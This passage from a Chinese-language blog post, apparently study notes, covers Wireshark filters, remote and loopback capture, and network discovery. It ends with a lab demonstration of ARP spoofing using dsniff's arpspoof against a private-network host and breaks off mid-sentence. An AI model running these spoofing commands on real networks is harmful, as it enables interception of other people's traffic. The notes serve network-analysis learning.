src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597947739-2a348fee-51e0-4c72-8253-9b2ded65fbdc.png#align=left&display=inline&height=330&margin=%5Bobject%20Object%5D&name=image.png&originHeight=660&originWidth=644&size=127152&status=done&style=none&width=322" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605597947739-2a348fee-51e0-4c72-8253-9b2ded65fbdc.png#align=left&display=inline&height=330&margin=%5Bobject%20Object%5D&name=image.png&originHeight=660&originWidth=644&size=127152&status=done&style=none&width=322" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="wireshark包过滤器分类-遵循伯克利语法规则"><a href="#wireshark包过滤器分类-遵循伯克利语法规则" class="headerlink" title="wireshark包过滤器分类 - 遵循伯克利语法规则"></a>wireshark包过滤器分类 - 遵循伯克利语法规则</h3><h4 id="捕获过滤器-gt-在抓包之前进行设置，在抓取时，就不会抓取不符合文件的数据包"><a href="#捕获过滤器-gt-在抓包之前进行设置，在抓取时，就不会抓取不符合文件的数据包" class="headerlink" title="捕获过滤器 -&gt; 在抓包之前进行设置，在抓取时，就不会抓取不符合文件的数据包"></a>捕获过滤器 -&gt; 在抓包之前进行设置，在抓取时，就不会抓取不符合文件的数据包</h4><ul><li>只捕获目标端口为80的TCP数据包 -&gt; tcp dst port 80</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605600789660-89c5429d-7f5f-4183-a4d9-30e155016176.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&name=image.png&originHeight=532&originWidth=1854&size=93280&status=done&style=none&width=927" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605600789660-89c5429d-7f5f-4183-a4d9-30e155016176.png#align=left&display=inline&height=266&margin=%5Bobject%20Object%5D&name=image.png&originHeight=532&originWidth=1854&size=93280&status=done&style=none&width=927" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><ul><li>捕获目的主机IP地址为 192.168.123.37 的数据包 -&gt;  dst host 192.168.123.37</li></ul><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605598844368-732cad15-57e4-4dd9-abf0-d71be66473cf.png#align=left&display=inline&height=622&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1244&originWidth=1940&size=424659&status=done&style=none&width=970" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605598844368-732cad15-57e4-4dd9-abf0-d71be66473cf.png#align=left&display=inline&height=622&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1244&originWidth=1940&size=424659&status=done&style=none&width=970" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><ul><li>host 不支持 cidr 域名 书写</li></ul><hr><h4 id="筛选过滤器-（显示过滤器）-gt-抓包之后进行应用的，即再次筛选"><a href="#筛选过滤器-（显示过滤器）-gt-抓包之后进行应用的，即再次筛选" class="headerlink" title="筛选过滤器 （显示过滤器）-&gt; 抓包之后进行应用的，即再次筛选"></a>筛选过滤器 （显示过滤器）-&gt; 抓包之后进行应用的，即再次筛选</h4><p>然后显示过滤器有两种创建方式</p><ol><li>输入框创建</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601233639-e457aa42-a7b5-4891-8fc2-c698c34c1ecd.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=1978&size=53501&status=done&style=none&width=989" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601233639-e457aa42-a7b5-4891-8fc2-c698c34c1ecd.png#align=left&display=inline&height=81&margin=%5Bobject%20Object%5D&name=image.png&originHeight=162&originWidth=1978&size=53501&status=done&style=none&width=989" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p>当不知道如何创建就看下图这里<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605596905704-d89032c3-4269-4f6e-8810-ce1b552bebfa.png#align=left&display=inline&height=102&margin=%5Bobject%20Object%5D&name=image.png&originHeight=204&originWidth=1092&size=351036&status=done&style=none&width=546" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601817671-4b8aacb8-a22a-46ca-a9ee-3d63fc6252b0.png#align=left&display=inline&height=127&margin=%5Bobject%20Object%5D&name=image.png&originHeight=254&originWidth=1676&size=71687&status=done&style=none&width=838" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601817671-4b8aacb8-a22a-46ca-a9ee-3d63fc6252b0.png#align=left&display=inline&height=127&margin=%5Bobject%20Object%5D&name=image.png&originHeight=254&originWidth=1676&size=71687&status=done&style=none&width=838" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><ol start="2"><li>数据包细节面板创建</li></ol><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601904173-042a79ec-cc27-412c-af8e-31788678c6cd.png#align=left&display=inline&height=958&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1916&originWidth=1916&size=548155&status=done&style=none&width=958" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605601904173-042a79ec-cc27-412c-af8e-31788678c6cd.png#align=left&display=inline&height=958&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1916&originWidth=1916&size=548155&status=done&style=none&width=958" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><p><code>... and Selected</code> 表示 <code>目前的过滤器 + and 进行连接</code><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605602001225-0aa493f3-13c3-4b9e-8289-03f735d8542a.png#align=left&display=inline&height=274&margin=%5Bobject%20Object%5D&name=image.png&originHeight=548&originWidth=1742&size=173915&status=done&style=none&width=871" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605602001225-0aa493f3-13c3-4b9e-8289-03f735d8542a.png#align=left&display=inline&height=274&margin=%5Bobject%20Object%5D&name=image.png&originHeight=548&originWidth=1742&size=173915&status=done&style=none&width=871" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>一开始是只有 <code>Selected</code> 和 Not <code>Selected</code> 的</p><ul><li>表达式规则<ul><li>主题 + 运算符 + 值</li><li>逻辑关系 与 或 非 -&gt; and (&amp;&amp;) or (||) not (!)</li></ul></li></ul><hr><h2 id="Wireshark-捕获数据包文件保存"><a href="#Wireshark-捕获数据包文件保存" class="headerlink" title="Wireshark 捕获数据包文件保存"></a>Wireshark 捕获数据包文件保存</h2><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403657147-c0c230fd-d6d4-4ce2-947c-7ad19f6b7a2c.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403657147-c0c230fd-d6d4-4ce2-947c-7ad19f6b7a2c.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605603567135-ad1cb52f-9675-4759-be52-08a54b9edd37.png#align=left&display=inline&height=470&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=1874&size=163117&status=done&style=none&width=937" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605603567135-ad1cb52f-9675-4759-be52-08a54b9edd37.png#align=left&display=inline&height=470&margin=%5Bobject%20Object%5D&name=image.png&originHeight=940&originWidth=1874&size=163117&status=done&style=none&width=937" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h2 id="杂项设置"><a href="#杂项设置" class="headerlink" title="杂项设置"></a>杂项设置</h2><h3 id="wireshark-数据包颜色的意思"><a href="#wireshark-数据包颜色的意思" class="headerlink" title="wireshark 数据包颜色的意思"></a>wireshark 数据包颜色的意思</h3><p>可以通过 视图 -&gt; 着色规则进行查看<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403830739-6199a1ef-386d-41e9-84f9-3b62a9831357.png#align=left&display=inline&height=497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=497&originWidth=411&size=34240&status=done&style=none&width=411" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403830739-6199a1ef-386d-41e9-84f9-3b62a9831357.png#align=left&display=inline&height=497&margin=%5Bobject%20Object%5D&name=image.png&originHeight=497&originWidth=411&size=34240&status=done&style=none&width=411" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403800570-75efd63b-cb87-4794-91df-d72ffbd50b9f.png#align=left&display=inline&height=544&margin=%5Bobject%20Object%5D&name=image.png&originHeight=544&originWidth=739&size=56387&status=done&style=none&width=739" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609403800570-75efd63b-cb87-4794-91df-d72ffbd50b9f.png#align=left&display=inline&height=544&margin=%5Bobject%20Object%5D&name=image.png&originHeight=544&originWidth=739&size=56387&status=done&style=none&width=739" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="wireshark-故障包过滤"><a href="#wireshark-故障包过滤" class="headerlink" title="wireshark 故障包过滤"></a>wireshark 故障包过滤</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405235320-31bd23b5-dc62-4c14-bf3f-fb4dd674d692.png#align=left&display=inline&height=534&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=501&size=38877&status=done&style=none&width=501" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405235320-31bd23b5-dc62-4c14-bf3f-fb4dd674d692.png#align=left&display=inline&height=534&margin=%5Bobject%20Object%5D&name=image.png&originHeight=534&originWidth=501&size=38877&status=done&style=none&width=501" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>有5个等级</p><ul><li>Error 严重错误，譬如：畸形数据包或识别出数据包协议头部的某些字段和预期值不符</li><li>Warning 一般性问题（应用程序问题或通信问题），譬如：TCP zero window ,TCP window full ,TCP报文段失序，TCP报文段丢失</li><li>Note 可能引发故障的异常现象（正常行为），譬如：TCP重传，重复确认，快速重传</li><li>Chat 符合常规流量的特征，譬如：SYN,FIN,RST</li><li>Comment</li><li>OK</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">_ws.expert.severity &lt;= Note</span><br><span class="line">或者</span><br><span class="line">_ws.expert.severity &lt;= Chat</span><br></pre></td></tr></table></figure><h3 id="查看wireshark-内置文件路径"><a href="#查看wireshark-内置文件路径" class="headerlink" title="查看wireshark 内置文件路径"></a>查看wireshark 内置文件路径</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623740999-b327567c-e8cd-4775-ac39-abbf8a1ed8fe.png#align=left&display=inline&height=713&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1426&originWidth=1816&size=1833604&status=done&style=none&width=908" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623740999-b327567c-e8cd-4775-ac39-abbf8a1ed8fe.png#align=left&display=inline&height=713&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1426&originWidth=1816&size=1833604&status=done&style=none&width=908" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h3 id="修改wireshark默认配置"><a href="#修改wireshark默认配置" class="headerlink" title="修改wireshark默认配置"></a>修改wireshark默认配置</h3><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623841618-e72dfc53-1370-4b9d-a2d5-dd8d98591861.png#align=left&display=inline&height=177&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=976&size=317484&status=done&style=none&width=488" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605623841618-e72dfc53-1370-4b9d-a2d5-dd8d98591861.png#align=left&display=inline&height=177&margin=%5Bobject%20Object%5D&name=image.png&originHeight=354&originWidth=976&size=317484&status=done&style=none&width=488" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h1 id="Wireshark-网络分析"><a href="#Wireshark-网络分析" class="headerlink" title="Wireshark 网络分析"></a>Wireshark 网络分析</h1><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405807703-705be97f-0b00-41f6-a125-f9e3d7051779.png" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1609405807703-705be97f-0b00-41f6-a125-f9e3d7051779.png" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII="># Wireshark 部署方式</p><h2 id="远程数据包捕获"><a href="#远程数据包捕获" class="headerlink" title="远程数据包捕获"></a>远程数据包捕获</h2><h3 id="方式1"><a href="#方式1" class="headerlink" title="方式1:"></a>方式1:</h3><p>开启远程桌面，rdp服务，在系统中安装wireshark进行抓包分析<br>缺点: 在于远程登录过程中，都会产生无关与目的远程连接数据流量</p><h3 id="方式2-wireshark-远程抓包"><a href="#方式2-wireshark-远程抓包" class="headerlink" title="方式2: wireshark 远程抓包"></a>方式2: wireshark 远程抓包</h3><h4 id="windows"><a href="#windows" class="headerlink" title="windows"></a>windows</h4><p>服务端: <a href="https://www.winpcap.org/install/">winpcap</a> -&gt; rpcapd</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> <span class="string">&quot;C:\Program Files (x86)\WinPcap\&quot;</span></span><br><span class="line"><span class="string">.\rpcapd.exe -n</span></span><br></pre></td></tr></table></figure><p>客户端: wireshark<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605676732054-bd608dd9-be39-4dfb-91af-3002a9de591c.png#align=left&display=inline&height=888&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1775&originWidth=2206&size=596392&status=done&style=none&width=1103" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605676732054-bd608dd9-be39-4dfb-91af-3002a9de591c.png#align=left&display=inline&height=888&margin=%5Bobject%20Object%5D&name=image.png&originHeight=1775&originWidth=2206&size=596392&status=done&style=none&width=1103" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605678302231-aaa5d801-10bd-4863-8f5f-07fd6d7265c3.png#align=left&display=inline&height=467&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1902&size=98173&status=done&style=none&width=951" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605678302231-aaa5d801-10bd-4863-8f5f-07fd6d7265c3.png#align=left&display=inline&height=467&margin=%5Bobject%20Object%5D&name=image.png&originHeight=934&originWidth=1902&size=98173&status=done&style=none&width=951" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"></p><h4 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h4><h4 id="macos"><a href="#macos" class="headerlink" title="macos"></a>macos</h4><p>注意 macos 版本没有直接抓取数据包的功能，可参考<br><a href="https://distanceblog.github.io/2020/06/05/wireshark%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8C%85/">https://distanceblog.github.io/2020/06/05/wireshark%E8%BF%9C%E7%A8%8B%E6%8A%93%E5%8C%85/</a></p><h2 id="本地数据包捕获"><a href="#本地数据包捕获" class="headerlink" title="本地数据包捕获"></a>本地数据包捕获</h2><p>wireshark 不能抓取本地环回网卡数据包<br>不过可以使用 RawCap<br><a href="https://www.netresec.com/?page=RawCap">https://www.netresec.com/?page=RawCap</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cmd</span></span><br><span class="line">RawCap.exe</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605699228594-f4ee4760-57be-4837-b267-5780e1042f6d.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=906&size=39166&status=done&style=none&width=453" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605699228594-f4ee4760-57be-4837-b267-5780e1042f6d.png#align=left&display=inline&height=154&margin=%5Bobject%20Object%5D&name=image.png&originHeight=308&originWidth=906&size=39166&status=done&style=none&width=453" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>然后浏览器访问 localhost</p><p>不过可以通过访问本机 ip 代替 localhost 间接捉取数据包（狗头</p><h2 id="虚拟机数据包捕获"><a href="#虚拟机数据包捕获" class="headerlink" title="虚拟机数据包捕获"></a>虚拟机数据包捕获</h2><p>选择对应网卡即可。。。</p><p>比如在 kali 上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo netdiscover -r 192.168.18.1/24</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605704939792-bee30349-ecf6-4996-84d7-d48187d111e0.png#align=left&display=inline&height=302&margin=%5Bobject%20Object%5D&name=image.png&originHeight=604&originWidth=1702&size=239244&status=done&style=none&width=851" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605704939792-bee30349-ecf6-4996-84d7-d48187d111e0.png#align=left&display=inline&height=302&margin=%5Bobject%20Object%5D&name=image.png&originHeight=604&originWidth=1702&size=239244&status=done&style=none&width=851" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>哈哈哈哈，原来arp广播还真就这么直白，，Who has ….? Tell …（netdiscover 还真直白</p><h2 id="ARP欺骗捕获数据包"><a href="#ARP欺骗捕获数据包" class="headerlink" title="ARP欺骗捕获数据包"></a>ARP欺骗捕获数据包</h2><h3 id="攻击原则"><a href="#攻击原则" class="headerlink" title="攻击原则"></a><a href="https://blog.csdn.net/rectsuly/article/details/63261412">攻击原则</a></h3><ul><li>任何主机均能发送伪造包给局域网中的另一主机；</li><li>任一主机相信它们接受到的所有包；</li><li>当一个新的响应包到达时，它甚至在没有请求包被发送的情况下覆盖掉旧的记录。</li></ul><h3 id="实践"><a href="#实践" class="headerlink" title="实践"></a>实践</h3><p>kali 一般要先安装</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install dsniff</span><br></pre></td></tr></table></figure><p>kali 上运行</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arpspoof -i eth0 -t &lt;欺骗的目标&gt; &lt;我是谁&gt;</span><br><span class="line"><span class="comment"># 如</span></span><br><span class="line">sudo arpspoof -i eth0 -t 192.168.123.37 192.168.123.1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605709097184-f4dc2fbd-0035-4ba3-8516-feef4b2596fc.png#align=left&display=inline&height=91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=182&originWidth=1468&size=72197&status=done&style=none&width=734" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605709097184-f4dc2fbd-0035-4ba3-8516-feef4b2596fc.png#align=left&display=inline&height=91&margin=%5Bobject%20Object%5D&name=image.png&originHeight=182&originWidth=1468&size=72197&status=done&style=none&width=734" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>然后此时在 <code>192.168.123.37</code> 这台机器上wireshark 选择网卡 eth0，因为是欺骗这一张网卡，wireshark 筛选过滤器填入 <code>icmp</code> 查看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 然后在 192.168.123.37 上 ping 网关</span></span><br><span class="line">ping 192.168.123.1</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715163193-77424cbc-ce52-41bf-b66d-0342db71c9d9.png#align=left&display=inline&height=255&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=1916&size=161118&status=done&style=none&width=958" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715163193-77424cbc-ce52-41bf-b66d-0342db71c9d9.png#align=left&display=inline&height=255&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=1916&size=161118&status=done&style=none&width=958" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>会发现 192.168.123.1 的 mac 地址是 kali的。。。<br><img src="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715182447-6145d3c6-a889-409e-830e-acafe83dda8b.png#align=left&display=inline&height=254&margin=%5Bobject%20Object%5D&name=image.png&originHeight=508&originWidth=1414&size=190359&status=done&style=none&width=707" class="lazyload" data-srcset="https://cdn.nlark.com/yuque/0/2020/png/2789727/1605715182447-6145d3c6-a889-409e-830e-acafe83dda8b.png#align=left&display=inline&height=254&margin=%5Bobject%20Object%5D&name=image.png&originHeight=508&originWidth=1414&size=190359&status=done&style=none&width=707" srcset="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAABGdBTUEAALGPC/xhBQAAADhlWElmTU0AKgAAAAgAAYdpAAQAAAABAAAAGgAAAAAAAqACAAQAAAABAAAAAaADAAQAAAABAAAAAQAAAADa6r/EAAAAC0lEQVQIHWNgAAIAAAUAAY27m/MAAAAASUVORK5CYII=" alt="image.png"><br>所以在 <code>192.168.123.37</code> 上是上不了网的，除非kali上开启了数据包转发，当 <code>ip_forward</code> 为 0 时，<code>欺骗的目标</code> 上不了网，当该值为 